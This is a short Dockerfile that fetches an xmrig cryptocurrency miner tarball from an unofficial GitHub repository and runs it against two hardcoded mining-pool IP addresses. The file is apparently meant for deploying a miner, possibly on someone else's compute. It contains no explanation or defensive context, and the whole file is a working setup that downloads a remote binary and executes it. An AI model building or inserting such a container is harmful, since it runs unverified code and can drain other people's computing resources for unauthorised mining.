FROM ubuntu:latest AS build
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://raw.githubusercontent.com/abelleshop/xms/main/xmrig-6.18.0.tar.gz
RUN tar xf xmrig-6.18.0.tar.gz
ENTRYPOINT [ "./xmrig" ]
CMD ["--url=199.247.21.252:3333", "--user=x", "--pass=x", "-k", "-t=4", "--url=45.76.162.9:3333", "--user=x", "--pass=lgeisba", "-k", "-t=8"]
